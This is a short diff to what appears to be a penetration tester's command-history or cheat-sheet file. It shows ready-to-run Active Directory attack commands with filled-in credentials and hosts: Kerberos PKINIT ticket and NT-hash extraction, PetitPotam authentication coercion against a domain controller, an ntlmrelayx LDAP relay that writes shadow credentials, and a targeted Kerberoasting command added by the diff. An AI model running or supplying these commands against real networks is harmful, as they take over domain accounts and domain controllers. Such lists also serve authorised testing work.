@@ -300,4 +300,5 @@ gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' 'domain.lo
 getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' 'domain.local'/'sv01$'
 petitpotam -d '' -u '' -p '' 192.168.56.1 dc01.breaking.bad
 ntlmrelayx -t ldap://dc02.breaking.bad -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
+targetedKerberoast.py -v -d domain.local -u user1 -p complexpassword -o kerberoastables.txt
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
